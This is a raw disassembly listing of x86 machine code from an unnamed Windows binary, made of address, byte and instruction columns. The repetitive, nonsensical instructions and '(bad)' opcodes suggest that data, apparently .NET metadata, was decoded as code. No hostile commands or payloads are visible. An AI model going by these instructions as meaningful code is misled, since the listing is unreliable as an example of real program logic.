  405e5c:	01 00                	add    %eax,(%eax)
  405e5e:	25 02 07 08 01       	and    $0x1080702,%eax
  405e63:	00 59 03             	add    %bl,0x3(%ecx)
  405e66:	c2 07 06             	ret    $0x607
  405e69:	00 8a 0b c2 07 06    	add    %cl,0x607c20b(%edx)
  405e6f:	00 15 14 f3 07 06    	add    %dl,0x607f314
  405e75:	00 bb 13 20 04 06    	add    %bh,0x6042013(%ebx)
  405e7b:	00 56 0f             	add    %dl,0xf(%esi)
  405e7e:	20 04 01             	and    %al,(%ecx,%eax,1)
  405e81:	00 25 02 07 08 36    	add    %ah,0x36080702
  405e87:	00 23                	add    %ah,(%ebx)
  405e89:	04 0c                	add    $0xc,%al
  405e8b:	08 16                	or     %dl,(%esi)
  405e8d:	00 17                	add    %dl,(%edi)
  405e8f:	00 dc                	add    %bl,%ah
  405e91:	07                   	pop    %es
  405e92:	06                   	push   %es
  405e93:	00 8a 0b c2 07 06    	add    %cl,0x607c20b(%edx)
  405e99:	00 15 14 f3 07 01    	add    %dl,0x107f314
  405e9f:	00 25 02 07 08 36    	add    %ah,0x36080702
  405ea5:	00 23                	add    %ah,(%ebx)
  405ea7:	04 11                	add    $0x11,%al
  405ea9:	08 16                	or     %dl,(%esi)
  405eab:	00 17                	add    %dl,(%edi)
  405ead:	00 16                	add    %dl,(%esi)
  405eaf:	08 06                	or     %al,(%esi)
  405eb1:	00 8a 0b c2 07 06    	add    %cl,0x607c20b(%edx)
  405eb7:	00 15 14 f3 07 01    	add    %dl,0x107f314
  405ebd:	00 df                	add    %bl,%bh
  405ebf:	02 20                	add    (%eax),%ah
  405ec1:	08 01                	or     %al,(%ecx)
  405ec3:	00 27                	add    %ah,(%edi)
  405ec5:	03 25 08 01 00 25    	add    0x25000108,%esp
  405ecb:	02 2a                	add    (%edx),%ch
  405ecd:	08 36                	or     %dh,(%esi)
  405ecf:	00 23                	add    %ah,(%ebx)
  405ed1:	04 34                	add    $0x34,%al
  405ed3:	08 16                	or     %dl,(%esi)
  405ed5:	00 51 00             	add    %dl,0x0(%ecx)
  405ed8:	16                   	push   %ss
  405ed9:	08 06                	or     %al,(%esi)
  405edb:	00 ad 08 20 04 06    	add    %ch,0x6042008(%ebp)
  405ee1:	00 8a 0b c2 07 06    	add    %cl,0x607c20b(%edx)
  405ee7:	00 15 14 f3 07 01    	add    %dl,0x107f314
  405eed:	00 63 02             	add    %ah,0x2(%ebx)
  405ef0:	be 07 01 00 00       	mov    $0x107,%esi
  405ef5:	03 c2                	add    %edx,%eax
  405ef7:	07                   	pop    %es
  405ef8:	01 00                	add    %eax,(%eax)
  405efa:	25 02 07 08 06       	and    $0x6080702,%eax
  405eff:	00 8a 0b c2 07 06    	add    %cl,0x607c20b(%edx)
  405f05:	00 15 14 f3 07 06    	add    %dl,0x607f314
  405f0b:	00 f2                	add    %dh,%dl
  405f0d:	17                   	pop    %ss
  405f0e:	f8                   	clc
  405f0f:	07                   	pop    %es
  405f10:	01 00                	add    %eax,(%eax)
  405f12:	63 02                	arpl   %eax,(%edx)
  405f14:	39 08                	cmp    %ecx,(%eax)
  405f16:	01 00                	add    %eax,(%eax)
  405f18:	00 03                	add    %al,(%ebx)
  405f1a:	c2 07 01             	ret    $0x107
  405f1d:	00 45 03             	add    %al,0x3(%ebp)
  405f20:	be 07 01 00 61       	mov    $0x61000107,%esi
  405f25:	03 c2                	add    %edx,%eax
  405f27:	07                   	pop    %es
  405f28:	01 00                	add    %eax,(%eax)
  405f2a:	25 02 07 08 06       	and    $0x6080702,%eax
  405f2f:	00 8a 0b c2 07 06    	add    %cl,0x607c20b(%edx)
  405f35:	00 15 14 f3 07 01    	add    %dl,0x107f314
  405f3b:	00 c4                	add    %al,%ah
  405f3d:	02 d8                	add    %al,%bl
  405f3f:	07                   	pop    %es
  405f40:	01 00                	add    %eax,(%eax)
  405f42:	25 02 07 08 06       	and    $0x6080702,%eax
  405f47:	00 8a 0b c2 07 06    	add    %cl,0x607c20b(%edx)
  405f4d:	00 15 14 f3 07 01    	add    %dl,0x107f314
  405f53:	00 25 02 07 08 50    	add    %ah,0x50080702
  405f59:	20 00                	and    %al,(%eax)
  405f5b:	00 00                	add    %al,(%eax)
  405f5d:	00 96 00 28 1c cf    	add    %dl,-0x30e3d800(%esi)
  405f63:	04 01                	add    $0x1,%al
  405f65:	00 00                	add    %al,(%eax)
  405f67:	00 00                	add    %al,(%eax)
  405f69:	00 80 00 91 20 25    	add    %al,0x25209100(%eax)
  405f6f:	1a 3c 08             	sbb    (%eax,%ecx,1),%bh
  405f72:	01 00                	add    %eax,(%eax)
  405f74:	00 00                	add    %al,(%eax)
  405f76:	00 00                	add    %al,(%eax)
  405f78:	80 00 91             	addb   $0x91,(%eax)
  405f7b:	20 82 08 42 08 03    	and    %al,0x3084208(%edx)
  405f81:	00 00                	add    %al,(%eax)
  405f83:	00 00                	add    %al,(%eax)
  405f85:	00 80 00 91 20 0f    	add    %al,0xf209100(%eax)
  405f8b:	1b 47 08             	sbb    0x8(%edi),%eax
  405f8e:	04 00                	add    $0x0,%al
  405f90:	40                   	inc    %eax
  405f91:	21 00                	and    %eax,(%eax)
  405f93:	00 00                	add    %al,(%eax)
  405f95:	00 96 00 b7 19 cf    	add    %dl,-0x30e64900(%esi)
  405f9b:	04 08                	add    $0x8,%al
  405f9d:	00 a4 21 00 00 00 00 	add    %ah,0x0(%ecx,%eiz,1)
  405fa4:	96                   	xchg   %eax,%esi
  405fa5:	00 be 0a cf 04 08    	add    %bh,0x804cf0a(%esi)
  405fab:	00 00                	add    %al,(%eax)
  405fad:	00 00                	add    %al,(%eax)
  405faf:	00 80 00 91 20 24    	add    %al,0x24209100(%eax)
  405fb5:	0b e4                	or     %esp,%esp
  405fb7:	01 08                	add    %ecx,(%eax)
  405fb9:	00 54 22 00          	add    %dl,0x0(%edx,%eiz,1)
  405fbd:	00 00                	add    %al,(%eax)
  405fbf:	00 96 00 2a 1e cf    	add    %dl,-0x30e1d600(%esi)
  405fc5:	04 08                	add    $0x8,%al
  405fc7:	00 7c 22 00          	add    %bh,0x0(%edx,%eiz,1)
  405fcb:	00 00                	add    %al,(%eax)
  405fcd:	00 96 00 a9 0d cf    	add    %dl,-0x30f25700(%esi)
  405fd3:	04 08                	add    $0x8,%al
  405fd5:	00 90 22 00 00 00    	add    %dl,0x22(%eax)
  405fdb:	00 91 00 c5 0d cf    	add    %dl,-0x30f23b00(%ecx)
  405fe1:	04 08                	add    $0x8,%al
  405fe3:	00 08                	add    %cl,(%eax)
  405fe5:	24 00                	and    $0x0,%al
  405fe7:	00 00                	add    %al,(%eax)
  405fe9:	00 96 00 28 1c cf    	add    %dl,-0x30e3d800(%esi)
  405fef:	04 08                	add    $0x8,%al
  405ff1:	00 28                	add    %ch,(%eax)
  405ff3:	24 00                	and    $0x0,%al
  405ff5:	00 00                	add    %al,(%eax)
  405ff7:	00 91 00 be 13 cf    	add    %dl,-0x30ec4200(%ecx)
  405ffd:	04 08                	add    $0x8,%al
  405fff:	00 dc                	add    %bl,%ah
  406001:	24 00                	and    $0x0,%al
  406003:	00 00                	add    %al,(%eax)
  406005:	00 96 00 c8 13 cf    	add    %dl,-0x30ec3800(%esi)
  40600b:	04 08                	add    $0x8,%al
  40600d:	00 e4                	add    %ah,%ah
  40600f:	24 00                	and    $0x0,%al
  406011:	00 00                	add    %al,(%eax)
  406013:	00 91 18 cc 15 cf    	add    %dl,-0x30ea33e8(%ecx)
  406019:	04 08                	add    $0x8,%al
  40601b:	00 00                	add    %al,(%eax)
  40601d:	00 00                	add    %al,(%eax)
  40601f:	00 80 00 91 20 e5    	add    %al,-0x1adf6f00(%eax)
  406025:	19 50 08             	sbb    %edx,0x8(%eax)
  406028:	08 00                	or     %al,(%eax)
  40602a:	00 00                	add    %al,(%eax)
  40602c:	00 00                	add    %al,(%eax)
  40602e:	80 00 91             	addb   $0x91,(%eax)
  406031:	20 85 1d 57 08 0b    	and    %al,0xb08571d(%ebp)
  406037:	00 00                	add    %al,(%eax)
  406039:	00 00                	add    %al,(%eax)
  40603b:	00 80 00 91 20 56    	add    %al,0x56209100(%eax)
  406041:	1e                   	push   %ds
  406042:	60                   	pusha
  406043:	08 10                	or     %dl,(%eax)
  406045:	00 00                	add    %al,(%eax)
  406047:	00 00                	add    %al,(%eax)
  406049:	00 80 00 91 20 12    	add    %al,0x12209100(%eax)
  40604f:	06                   	push   %es
  406050:	6b 08 15             	imul   $0x15,(%eax),%ecx
  406053:	00 00                	add    %al,(%eax)
  406055:	00 00                	add    %al,(%eax)
  406057:	00 80 00 91 20 92    	add    %al,-0x6ddf6f00(%eax)
  40605d:	08 77 08             	or     %dh,0x8(%edi)
  406060:	1c 00                	sbb    $0x0,%al
  406062:	f8                   	clc
  406063:	24 00                	and    $0x0,%al
  406065:	00 00                	add    %al,(%eax)
  406067:	00 96 00 b9 1d 4e    	add    %dl,0x4e1db900(%esi)
  40606d:	01 1d 00 4c 25 00    	add    %ebx,0x254c00
  406073:	00 00                	add    %al,(%eax)
  406075:	00 96 00 ea 1a 7c    	add    %dl,0x7c1aea00(%esi)
  40607b:	08 1e                	or     %bl,(%esi)
  40607d:	00 20                	add    %ah,(%eax)
  40607f:	26 00 00             	add    %al,%es:(%eax)
  406082:	00 00                	add    %al,(%eax)
  406084:	91                   	xchg   %eax,%ecx
  406085:	00 f7                	add    %dh,%bh
  406087:	11 83 08 20 00 44    	adc    %eax,0x44002008(%ebx)
  40608d:	26 00 00             	add    %al,%es:(%eax)
  406090:	00 00                	add    %al,(%eax)
  406092:	86 18                	xchg   %bl,(%eax)
  406094:	c6                   	(bad)
  406095:	15 06 00 21 00       	adc    $0x210006,%eax
  40609a:	00 00                	add    %al,(%eax)
  40609c:	00 00                	add    %al,(%eax)
  40609e:	80 00 91             	addb   $0x91,(%eax)
  4060a1:	20 3d 1e 42 08 21    	and    %bh,0x2108421e
  4060a7:	00 00                	add    %al,(%eax)
  4060a9:	00 00                	add    %al,(%eax)
  4060ab:	00 80 00 91 20 25    	add    %al,0x25209100(%eax)
  4060b1:	1a 3c 08             	sbb    (%eax,%ecx,1),%bh
  4060b4:	22 00                	and    (%eax),%al
  4060b6:	00 00                	add    %al,(%eax)
  4060b8:	00 00                	add    %al,(%eax)
  4060ba:	80 00 91             	addb   $0x91,(%eax)
  4060bd:	20 0f                	and    %cl,(%edi)
  4060bf:	1b 47 08             	sbb    0x8(%edi),%eax
  4060c2:	24 00                	and    $0x0,%al
  4060c4:	4c                   	dec    %esp
  4060c5:	26 00 00             	add    %al,%es:(%eax)
  4060c8:	00 00                	add    %al,(%eax)
  4060ca:	96                   	xchg   %eax,%esi
  4060cb:	00 0e                	add    %cl,(%esi)
  4060cd:	11 cf                	adc    %ecx,%edi
  4060cf:	04 28                	add    $0x28,%al
  4060d1:	00 00                	add    %al,(%eax)
  4060d3:	00 00                	add    %al,(%eax)
  4060d5:	00 80 00 91 20 25    	add    %al,0x25209100(%eax)
  4060db:	1a 3c 08             	sbb    (%eax,%ecx,1),%bh
  4060de:	28 00                	sub    %al,(%eax)
  4060e0:	00 00                	add    %al,(%eax)
  4060e2:	00 00                	add    %al,(%eax)
  4060e4:	80 00 91             	addb   $0x91,(%eax)
  4060e7:	20 82 08 42 08 2a    	and    %al,0x2a084208(%edx)
  4060ed:	00 00                	add    %al,(%eax)
  4060ef:	00 00                	add    %al,(%eax)
  4060f1:	00 80 00 91 20 0f    	add    %al,0xf209100(%eax)
  4060f7:	1b 47 08             	sbb    0x8(%edi),%eax
  4060fa:	2b 00                	sub    (%eax),%eax
  4060fc:	d8 26                	fsubs  (%esi)
  4060fe:	00 00                	add    %al,(%eax)
  406100:	00 00                	add    %al,(%eax)
  406102:	96                   	xchg   %eax,%esi
  406103:	00 9f 19 cf 04 2f    	add    %bl,0x2f04cf19(%edi)
  406109:	00 3c 27             	add    %bh,(%edi,%eiz,1)
  40610c:	00 00                	add    %al,(%eax)
  40610e:	00 00                	add    %al,(%eax)
  406110:	96                   	xchg   %eax,%esi
  406111:	00 18                	add    %bl,(%eax)
  406113:	13 b7 00 2f 00 00    	adc    0x2f00(%edi),%esi
  406119:	00 00                	add    %al,(%eax)
  40611b:	00 80 00 91 20 5a    	add    %al,0x5a209100(%eax)
  406121:	10 89 08 30 00 50    	adc    %cl,0x50003008(%ecx)
  406127:	28 00                	sub    %al,(%eax)
  406129:	00 00                	add    %al,(%eax)
  40612b:	00 96 00 32 10 e4    	add    %dl,-0x1befce00(%esi)
  406131:	01 33                	add    %esi,(%ebx)
  406133:	00 84 28 00 00 00 00 	add    %al,0x0(%eax,%ebp,1)
  40613a:	96                   	xchg   %eax,%esi
  40613b:	00 3f                	add    %bh,(%edi)
  40613d:	10 e4                	adc    %ah,%ah
  40613f:	01 33                	add    %esi,(%ebx)
  406141:	00 b8 28 00 00 00    	add    %bh,0x28(%eax)
  406147:	00 96 00 28 1c cf    	add    %dl,-0x30e3d800(%esi)
  40614d:	04 33                	add    $0x33,%al
  40614f:	00 20                	add    %ah,(%eax)
  406151:	29 00                	sub    %eax,(%eax)
  406153:	00 00                	add    %al,(%eax)
  406155:	00 91 00 cf 11 cf    	add    %dl,-0x30ee3100(%ecx)
  40615b:	04 33                	add    $0x33,%al
  40615d:	00 b4 29 00 00 00 00 	add    %dh,0x0(%ecx,%ebp,1)
  406164:	91                   	xchg   %eax,%ecx
  406165:	00 29                	add    %ch,(%ecx)
  406167:	07                   	pop    %es
  406168:	eb 02                	jmp    0x40616c
  40616a:	33 00                	xor    (%eax),%eax
  40616c:	54                   	push   %esp
  40616d:	2a 00                	sub    (%eax),%al
  40616f:	00 00                	add    %al,(%eax)
  406171:	00 96 00 28 1c cf    	add    %dl,-0x30e3d800(%esi)
  406177:	04 34                	add    $0x34,%al
  406179:	00 1c 2b             	add    %bl,(%ebx,%ebp,1)
  40617c:	00 00                	add    %al,(%eax)
  40617e:	00 00                	add    %al,(%eax)
  406180:	96                   	xchg   %eax,%esi
  406181:	00 cc                	add    %cl,%ah
  406183:	04 e4                	add    $0xe4,%al
  406185:	01 34 00             	add    %esi,(%eax,%eax,1)
  406188:	7b 2b                	jnp    0x4061b5
  40618a:	00 00                	add    %al,(%eax)
  40618c:	00 00                	add    %al,(%eax)
  40618e:	91                   	xchg   %eax,%ecx
  40618f:	00 63 06             	add    %ah,0x6(%ebx)
  406192:	e4 01                	in     $0x1,%al
  406194:	34 00                	xor    $0x0,%al
  406196:	8c 2b                	mov    %gs,(%ebx)
  406198:	00 00                	add    %al,(%eax)
  40619a:	00 00                	add    %al,(%eax)
  40619c:	91                   	xchg   %eax,%ecx
  40619d:	00 a7 0e e4 01 34    	add    %ah,0x3401e40e(%edi)
  4061a3:	00 00                	add    %al,(%eax)
  4061a5:	2c 00                	sub    $0x0,%al
  4061a7:	00 00                	add    %al,(%eax)
  4061a9:	00 91 00 85 0e e4    	add    %dl,-0x1bf17b00(%ecx)
  4061af:	01 34 00             	add    %esi,(%eax,%eax,1)
  4061b2:	74 2c                	je     0x4061e0
  4061b4:	00 00                	add    %al,(%eax)
  4061b6:	00 00                	add    %al,(%eax)
  4061b8:	91                   	xchg   %eax,%ecx
  4061b9:	00 be 04 e4 01 34    	add    %bh,0x3401e404(%esi)
  4061bf:	00 7c 2d 00          	add    %bh,0x0(%ebp,%ebp,1)
  4061c3:	00 00                	add    %al,(%eax)
  4061c5:	00 91 00 44 1b e4    	add    %dl,-0x1be4bc00(%ecx)
  4061cb:	01 34 00             	add    %esi,(%eax,%eax,1)
  4061ce:	e8 2d 00 00 00       	call   0x406200
  4061d3:	00 91 00 a5 1d e4    	add    %dl,-0x1be25b00(%ecx)
  4061d9:	01 34 00             	add    %esi,(%eax,%eax,1)
  4061dc:	30 2e                	xor    %ch,(%esi)
  4061de:	00 00                	add    %al,(%eax)
  4061e0:	00 00                	add    %al,(%eax)
  4061e2:	91                   	xchg   %eax,%ecx
  4061e3:	00 0d 1a e4 01 34    	add    %cl,0x3401e41a
  4061e9:	00 e8                	add    %ch,%al
  4061eb:	2e 00 00             	add    %al,%cs:(%eax)
  4061ee:	00 00                	add    %al,(%eax)
  4061f0:	91                   	xchg   %eax,%ecx
  4061f1:	00 42 16             	add    %al,0x16(%edx)
  4061f4:	e4 01                	in     $0x1,%al
  4061f6:	34 00                	xor    $0x0,%al
  4061f8:	54                   	push   %esp
  4061f9:	30 00                	xor    %al,(%eax)
  4061fb:	00 00                	add    %al,(%eax)
  4061fd:	00 91 00 bb 16 e4    	add    %dl,-0x1be94500(%ecx)
  406203:	01 34 00             	add    %esi,(%eax,%eax,1)
  406206:	5c                   	pop    %esp
  406207:	31 00                	xor    %eax,(%eax)
  406209:	00 00                	add    %al,(%eax)
  40620b:	00 91 18 cc 15 cf    	add    %dl,-0x30ea33e8(%ecx)
  406211:	04 34                	add    $0x34,%al
  406213:	00 50 33             	add    %dl,0x33(%eax)
  406216:	00 00                	add    %al,(%eax)
  406218:	00 00                	add    %al,(%eax)
  40621a:	96                   	xchg   %eax,%esi
  40621b:	00 2e                	add    %ch,(%esi)
  40621d:	08 cf                	or     %cl,%bh
  40621f:	04 34                	add    $0x34,%al
  406221:	00 c4                	add    %al,%ah
  406223:	33 00                	xor    (%eax),%eax
  406225:	00 00                	add    %al,(%eax)
  406227:	00 91 00 30 0f 4a    	add    %dl,0x4a0f3000(%ecx)
  40622d:	01 34 00             	add    %esi,(%eax,%eax,1)
  406230:	f0 33 00             	lock xor (%eax),%eax
  406233:	00 00                	add    %al,(%eax)
  406235:	00 91 00 92 1c fc    	add    %dl,-0x3e36e00(%ecx)
  40623b:	02 34 00             	add    (%eax,%eax,1),%dh
  40623e:	c8 34 00 00          	enter  $0x34,$0x0
  406242:	00 00                	add    %al,(%eax)
  406244:	91                   	xchg   %eax,%ecx
  406245:	18 cc                	sbb    %cl,%ah
  406247:	15 cf 04 36 00       	adc    $0x3604cf,%eax
  40624c:	f8                   	clc
  40624d:	34 00                	xor    $0x0,%al
  40624f:	00 00                	add    %al,(%eax)
  406251:	00 96 00 47 05 90    	add    %dl,-0x6ffab900(%esi)
  406257:	08 36                	or     %dh,(%esi)
  406259:	00 34 35 00 00 00 00 	add    %dh,0x0(,%esi,1)
  406260:	91                   	xchg   %eax,%ecx
  406261:	00 45 08             	add    %al,0x8(%ebp)
  406264:	68 00 36 00 d8       	push   $0xd8003600
  406269:	35 00 00 00 00       	xor    $0x0,%eax
  40626e:	91                   	xchg   %eax,%ecx
  40626f:	00 63 14             	add    %ah,0x14(%ebx)
  406272:	96                   	xchg   %eax,%esi
  406273:	08 37                	or     %dh,(%edi)
  406275:	00 00                	add    %al,(%eax)
  406277:	37                   	aaa
  406278:	00 00                	add    %al,(%eax)
  40627a:	00 00                	add    %al,(%eax)
  40627c:	91                   	xchg   %eax,%ecx
  40627d:	00 29                	add    %ch,(%ecx)
  40627f:	07                   	pop    %es
  406280:	eb 02                	jmp    0x406284
  406282:	38 00                	cmp    %al,(%eax)
  406284:	b0 37                	mov    $0x37,%al
  406286:	00 00                	add    %al,(%eax)
  406288:	00 00                	add    %al,(%eax)
  40628a:	91                   	xchg   %eax,%ecx
  40628b:	00 70 1b             	add    %dh,0x1b(%eax)
  40628e:	4a                   	dec    %edx
  40628f:	01 39                	add    %edi,(%ecx)
  406291:	00 50 38             	add    %dl,0x38(%eax)
  406294:	00 00                	add    %al,(%eax)
  406296:	00 00                	add    %al,(%eax)
  406298:	91                   	xchg   %eax,%ecx
  406299:	00 fa                	add    %bh,%dl
  40629b:	0d 68 00 39 00       	or     $0x390068,%eax
  4062a0:	b0 38                	mov    $0x38,%al
  4062a2:	00 00                	add    %al,(%eax)
  4062a4:	00 00                	add    %al,(%eax)
  4062a6:	91                   	xchg   %eax,%ecx
  4062a7:	00 c4                	add    %al,%ah
  4062a9:	11 9d 08 3a 00 0c    	adc    %ebx,0xc003a08(%ebp)
  4062af:	39 00                	cmp    %eax,(%eax)
  4062b1:	00 00                	add    %al,(%eax)
  4062b3:	00 91 00 b6 1b 68    	add    %dl,0x681bb600(%ecx)
  4062b9:	00 3d 00 70 39 00    	add    %bh,0x397000
  4062bf:	00 00                	add    %al,(%eax)
  4062c1:	00 91 00 7b 05 a4    	add    %dl,-0x5bfa8500(%ecx)
  4062c7:	08 3e                	or     %bh,(%esi)
  4062c9:	00 bb 39 00 00 00    	add    %bh,0x39(%ebx)
  4062cf:	00 96 00 8c 14 cf    	add    %dl,-0x30eb7400(%esi)
  4062d5:	04 40                	add    $0x40,%al
  4062d7:	00 c8                	add    %cl,%al
  4062d9:	39 00                	cmp    %eax,(%eax)
  4062db:	00 00                	add    %al,(%eax)
  4062dd:	00 91 18 cc 15 cf    	add    %dl,-0x30ea33e8(%ecx)
  4062e3:	04 40                	add    $0x40,%al
  4062e5:	00 68 3a             	add    %ch,0x3a(%eax)
  4062e8:	00 00                	add    %al,(%eax)
  4062ea:	00 00                	add    %al,(%eax)
  4062ec:	96                   	xchg   %eax,%esi
  4062ed:	00 2a                	add    %ch,(%edx)
  4062ef:	1e                   	push   %ds
  4062f0:	cf                   	iret
  4062f1:	04 40                	add    $0x40,%al
  4062f3:	00 9c 3a 00 00 00 00 	add    %bl,0x0(%edx,%edi,1)
  4062fa:	91                   	xchg   %eax,%ecx
  4062fb:	00 5c 09 4a          	add    %bl,0x4a(%ecx,%ecx,1)
  4062ff:	01 40 00             	add    %eax,0x0(%eax)
  406302:	fc                   	cld
  406303:	3a 00                	cmp    (%eax),%al
  406305:	00 00                	add    %al,(%eax)
  406307:	00 91 00 f7 07 b7    	add    %dl,-0x48f80900(%ecx)
  40630d:	00 40 00             	add    %al,0x0(%eax)
  406310:	44                   	inc    %esp
  406311:	3b 00                	cmp    (%eax),%eax
  406313:	00 00                	add    %al,(%eax)
  406315:	00 91 00 a8 1e b7    	add    %dl,-0x48e15800(%ecx)
  40631b:	00 41 00             	add    %al,0x0(%ecx)
  40631e:	a0 3b 00 00 00       	mov    0x3b,%al
  406323:	00 91 00 16 10 b7    	add    %dl,-0x48efea00(%ecx)
  406329:	00 42 00             	add    %al,0x0(%edx)
  40632c:	24 3c                	and    $0x3c,%al
  40632e:	00 00                	add    %al,(%eax)
  406330:	00 00                	add    %al,(%eax)
  406332:	91                   	xchg   %eax,%ecx
  406333:	00 f7                	add    %dh,%bh
  406335:	16                   	push   %ss
  406336:	b7 00                	mov    $0x0,%bh
  406338:	43                   	inc    %ebx
  406339:	00 c0                	add    %al,%al
  40633b:	3c 00                	cmp    $0x0,%al
  40633d:	00 00                	add    %al,(%eax)
  40633f:	00 91 00 b6 15 e4    	add    %dl,-0x1bea4a00(%ecx)
  406345:	01 44 00 fc          	add    %eax,-0x4(%eax,%eax,1)
  406349:	3c 00                	cmp    $0x0,%al
  40634b:	00 00                	add    %al,(%eax)
  40634d:	00 91 18 cc 15 cf    	add    %dl,-0x30ea33e8(%ecx)
  406353:	04 44                	add    $0x44,%al
  406355:	00 3c 3d 00 00 00 00 	add    %bh,0x0(,%edi,1)
  40635c:	91                   	xchg   %eax,%ecx
  40635d:	00 f7                	add    %dh,%bh
  40635f:	11 90 08 44 00 77    	adc    %edx,0x77004408(%eax)
  406365:	3d 00 00 00 00       	cmp    $0x0,%eax
  40636a:	91                   	xchg   %eax,%ecx
  40636b:	18 cc                	sbb    %cl,%ah
  40636d:	15 cf 04 44 00       	adc    $0x4404cf,%eax
  406372:	84 3d 00 00 00 00    	test   %bh,0x0
  406378:	91                   	xchg   %eax,%ecx
  406379:	08 30                	or     %dh,(%eax)
  40637b:	04 cf                	add    $0xcf,%al
  40637d:	04 44                	add    $0x44,%al
  40637f:	00 a4 3d 00 00 00 00 	add    %ah,0x0(%ebp,%edi,1)
  406386:	96                   	xchg   %eax,%esi
  406387:	00 4d 06             	add    %cl,0x6(%ebp)
  40638a:	cf                   	iret
  40638b:	04 44                	add    $0x44,%al
  40638d:	00 70 3e             	add    %dh,0x3e(%eax)
  406390:	00 00                	add    %al,(%eax)
  406392:	00 00                	add    %al,(%eax)
  406394:	91                   	xchg   %eax,%ecx
  406395:	00 a5 10 ac 08 44    	add    %ah,0x4408ac10(%ebp)
  40639b:	00 a4 3e 00 00 00 00 	add    %ah,0x0(%esi,%edi,1)
  4063a2:	91                   	xchg   %eax,%ecx
  4063a3:	18 cc                	sbb    %cl,%ah
  4063a5:	15 cf 04 46 00       	adc    $0x4604cf,%eax
  4063aa:	f8                   	clc
  4063ab:	3e 00 00             	add    %al,%ds:(%eax)
  4063ae:	00 00                	add    %al,(%eax)
  4063b0:	96                   	xchg   %eax,%esi
  4063b1:	00 28                	add    %ch,(%eax)
  4063b3:	1c cf                	sbb    $0xcf,%al
  4063b5:	04 46                	add    $0x46,%al
  4063b7:	00 4c 3f 00          	add    %cl,0x0(%edi,%edi,1)
  4063bb:	00 00                	add    %al,(%eax)
  4063bd:	00 96 00 c8 13 cf    	add    %dl,-0x30ec3800(%esi)
  4063c3:	04 46                	add    $0x46,%al
  4063c5:	00 68 3f             	add    %ch,0x3f(%eax)
  4063c8:	00 00                	add    %al,(%eax)
  4063ca:	00 00                	add    %al,(%eax)
  4063cc:	91                   	xchg   %eax,%ecx
  4063cd:	00 63 05             	add    %ah,0x5(%ebx)
  4063d0:	90                   	nop
  4063d1:	08 46 00             	or     %al,0x0(%esi)
  4063d4:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4063d5:	3f                   	aas
  4063d6:	00 00                	add    %al,(%eax)
  4063d8:	00 00                	add    %al,(%eax)
  4063da:	91                   	xchg   %eax,%ecx
  4063db:	00 a0 0b b7 00 46    	add    %ah,0x4600b70b(%eax)
  4063e1:	00 d8                	add    %bl,%al
  4063e3:	3f                   	aas
  4063e4:	00 00                	add    %al,(%eax)
  4063e6:	00 00                	add    %al,(%eax)
  4063e8:	91                   	xchg   %eax,%ecx
  4063e9:	18 cc                	sbb    %cl,%ah
  4063eb:	15 cf 04 47 00       	adc    $0x4704cf,%eax
  4063f0:	ec                   	in     (%dx),%al
  4063f1:	3f                   	aas
  4063f2:	00 00                	add    %al,(%eax)
  4063f4:	00 00                	add    %al,(%eax)
  4063f6:	96                   	xchg   %eax,%esi
  4063f7:	00 5b 0e             	add    %bl,0xe(%ebx)
  4063fa:	cf                   	iret
  4063fb:	04 47                	add    $0x47,%al
  4063fd:	00 3a                	add    %bh,(%edx)
  4063ff:	40                   	inc    %eax
  406400:	00 00                	add    %al,(%eax)
  406402:	00 00                	add    %al,(%eax)
  406404:	96                   	xchg   %eax,%esi
  406405:	00 4d 0e             	add    %cl,0xe(%ebp)
  406408:	cf                   	iret
  406409:	04 47                	add    $0x47,%al
  40640b:	00 54 40 00          	add    %dl,0x0(%eax,%eax,2)
  40640f:	00 00                	add    %al,(%eax)
  406411:	00 91 00 53 05 90    	add    %dl,-0x6ffaad00(%ecx)
  406417:	08 47 00             	or     %al,0x0(%edi)
  40641a:	90                   	nop
  40641b:	40                   	inc    %eax
  40641c:	00 00                	add    %al,(%eax)
  40641e:	00 00                	add    %al,(%eax)
  406420:	91                   	xchg   %eax,%ecx
  406421:	00 45 09             	add    %al,0x9(%ebp)
  406424:	b2 08                	mov    $0x8,%dl
  406426:	47                   	inc    %edi
  406427:	00 04 41             	add    %al,(%ecx,%eax,2)
  40642a:	00 00                	add    %al,(%eax)
  40642c:	00 00                	add    %al,(%eax)
  40642e:	91                   	xchg   %eax,%ecx
  40642f:	00 9c 0b b7 00 48 00 	add    %bl,0x4800b7(%ebx,%ecx,1)
  406436:	38 41 00             	cmp    %al,0x0(%ecx)
  406439:	00 00                	add    %al,(%eax)
  40643b:	00 91 18 cc 15 cf    	add    %dl,-0x30ea33e8(%ecx)
  406441:	04 49                	add    $0x49,%al
  406443:	00 94 41 00 00 00 00 	add    %dl,0x0(%ecx,%eax,2)
  40644a:	96                   	xchg   %eax,%esi
  40644b:	00 32                	add    %dh,(%edx)
  40644d:	06                   	push   %es
  40644e:	cf                   	iret
  40644f:	04 49                	add    $0x49,%al
  406451:	00 48 42             	add    %cl,0x42(%eax)
  406454:	00 00                	add    %al,(%eax)
  406456:	00 00                	add    %al,(%eax)
  406458:	91                   	xchg   %eax,%ecx
  406459:	00 83 1c b7 08 49    	add    %al,0x4908b71c(%ebx)
  40645f:	00 00                	add    %al,(%eax)
  406461:	43                   	inc    %ebx
  406462:	00 00                	add    %al,(%eax)
  406464:	00 00                	add    %al,(%eax)
  406466:	86 18                	xchg   %bl,(%eax)
  406468:	c6                   	(bad)
  406469:	15 06 00 4c 00       	adc    $0x4c0006,%eax
  40646e:	08 43 00             	or     %al,0x0(%ebx)
  406471:	00 00                	add    %al,(%eax)
  406473:	00 83 00 8c 01 06    	add    %al,0x6018c00(%ebx)
  406479:	00 4c 00 1c          	add    %cl,0x1c(%eax,%eax,1)
  40647d:	43                   	inc    %ebx
  40647e:	00 00                	add    %al,(%eax)
  406480:	00 00                	add    %al,(%eax)
  406482:	86 18                	xchg   %bl,(%eax)
  406484:	c6                   	(bad)
  406485:	15 06 00 4c 00       	adc    $0x4c0006,%eax
  40648a:	24 43                	and    $0x43,%al
  40648c:	00 00                	add    %al,(%eax)
  40648e:	00 00                	add    %al,(%eax)
  406490:	83 00 9c             	addl   $0xffffff9c,(%eax)
  406493:	01 be 08 4c 00 35    	add    %edi,0x35004c08(%esi)
  406499:	43                   	inc    %ebx
  40649a:	00 00                	add    %al,(%eax)
  40649c:	00 00                	add    %al,(%eax)
  40649e:	83 00 fc             	addl   $0xfffffffc,(%eax)
  4064a1:	01 bf 02 4d 00 44    	add    %edi,0x44004d02(%edi)
  4064a7:	43                   	inc    %ebx
  4064a8:	00 00                	add    %al,(%eax)
  4064aa:	00 00                	add    %al,(%eax)
